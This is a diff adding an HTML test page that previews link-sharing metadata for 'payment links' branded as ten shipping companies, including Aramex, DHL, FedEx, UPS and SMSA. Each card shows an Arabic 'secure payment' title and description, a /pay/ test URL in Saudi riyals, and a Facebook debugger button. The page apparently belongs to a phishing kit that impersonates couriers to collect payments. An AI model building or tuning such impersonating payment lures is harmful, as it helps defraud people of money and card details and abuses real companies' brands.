@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OG Meta Tags Verification - Live Test</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 32px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .test-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+        }
+        .company-test {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .company-test:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+        }
+        .company-header {
+            background: linear-gradient(135deg, #4f46e5, #7c3aed);
+            color: white;
+            padding: 20px;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .og-preview {
+            padding: 20px;
+        }
+        .og-image {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            background: #f3f4f6;
+        }
+        .og-title {
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 8px;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+        .og-description {
+            color: #6b7280;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        .test-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+            text-align: center;
+            display: inline-block;
+        }
+        .btn-primary {
+            background: #4f46e5;
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #4338ca;
+        }
+        .btn-secondary {
+            background: #e5e7eb;
+            color: #374151;
+        }
+        .btn-secondary:hover {
+            background: #d1d5db;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-right: 10px;
+        }
+        .status-ok {
+            background: #d1fae5;
+            color: #065f46;
+        }
+        .status-warning {
+            background: #fef3c7;
+            color: #92400e;
+        }
+        .image-info {
+            font-size: 11px;
+            color: #9ca3af;
+            margin-top: 5px;
+        }
+        .url-display {
+            background: #f9fafb;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            word-break: break-all;
+            margin-top: 10px;
+            border: 1px solid #e5e7eb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 OG Meta Tags Verification - Payment Links</h1>
+        <div class="test-grid" id="testGrid"></div>
+    </div>
+
+    <script>
+        const baseUrl = window.location.origin;
+        const companies = [
+            { name: "Aramex", key: "aramex", image: "/og-aramex.jpg", size: "52KB" },
+            { name: "DHL", key: "dhl", image: "/og-dhl.jpg", size: "50KB" },
+            { name: "FedEx", key: "fedex", image: "/og-fedex.jpg", size: "52KB" },
+            { name: "UPS", key: "ups", image: "/og-ups.jpg", size: "29KB" },
+            { name: "SMSA Express", key: "smsa", image: "/og-smsa.jpg", size: "58KB" },
+            { name: "Naqel", key: "naqel", image: "/og-naqel.jpg", size: "46KB" },
+            { name: "Zajil", key: "zajil", image: "/og-zajil.jpg", size: "47KB" },
+            { name: "Agility", key: "agility", image: "/og-agility.jpg", size: "50KB" },
+            { name: "Jinakum", key: "jinakum", image: "/og-jinakum.jpg", size: "42KB" },
+            { name: "Jinaken", key: "jinaken", image: "/og-jinaken.jpg", size: "42KB" },
+        ];
+
+        const companyMeta = {
+            aramex: {
+                title: "دفع آمن - أرامكس للشحن السريع 🚚",
+                description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅"
+            },
+            dhl: {
+                title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
+                description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍"
+            },
+            fedex: {
+                title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
+                description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰"
+            },
+            ups: {
+                title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
+                description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍"
+            },
+            smsa: {
+                title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
+                description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦"
+            },
+            naqel: {
+                title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
+                description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡"
+            },
+            zajil: {
+                title: "دفع آمن - زاجل للشحن السريع 📮",
+                description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦"
+            },
+            agility: {
+                title: "دفع آمن - أجيليتي للخدمات اللوجستية 🚚",
+                description: "أجيليتي - حلول سلسلة التوريد - أكمل دفعتك بأمان للحصول على خدمات لوجستية متكاملة في الخليج والعالم 🌐"
+            },
+            jinakum: {
+                title: "دفع آمن - جينا كم للشحن 📦",
+                description: "جينا كم - حلول شحن مبتكرة في الخليج - أكمل الدفع بأمان للحصول على خدمات لوجستية متطورة وتوصيل سريع 🚚"
+            },
+            jinaken: {
+                title: "دفع آمن - جيناكوم للشحن 🚛",
+                description: "جيناكوم - خدمات شحن عُمانية متميزة - ادفع بأمان واستفد من شبكة توزيع واسعة وخدمات توصيل موثوقة في عُمان 🇴🇲"
+            }
+        };
+
+        const grid = document.getElementById('testGrid');
+
+        companies.forEach(company => {
+            const testUrl = `${baseUrl}/pay/test123/recipient?company=${company.key}&currency=SAR&title=Payment`;
+            const meta = companyMeta[company.key];
+            
+            const card = document.createElement('div');
+            card.className = 'company-test';
+            card.innerHTML = `
+                <div class="company-header">
+                    <span class="status-badge status-ok">✓ JPEG</span>
+                    ${company.name}
+                </div>
+                <div class="og-preview">
+                    <img src="${company.image}" 
+                         alt="${company.name}" 
+                         class="og-image"
+                         onerror="this.style.background='#fee2e2'; this.alt='❌ Image load failed'">
+                    <div class="image-info">📏 1200x630px • 📦 ${company.size}</div>
+                    <div class="og-title">${meta.title}</div>
+                    <div class="og-description">${meta.description}</div>
+                    <div class="test-buttons">
+                        <a href="${testUrl}" target="_blank" class="btn btn-primary">
+                            🔗 Test Link
+                        </a>
+                        <button onclick="testFacebook('${testUrl}')" class="btn btn-secondary">
+                            📘 FB Debug
+                        </button>
+                    </div>
+                    <div class="url-display">${testUrl}</div>
+                </div>
+            `;
+            grid.appendChild(card);
+        });
+
+        function testFacebook(url) {
+            window.open(`https://developers.facebook.com/tools/debug/?q=${encodeURIComponent(url)}`, '_blank');
+        }
+    </script>
+</body>
+</html>
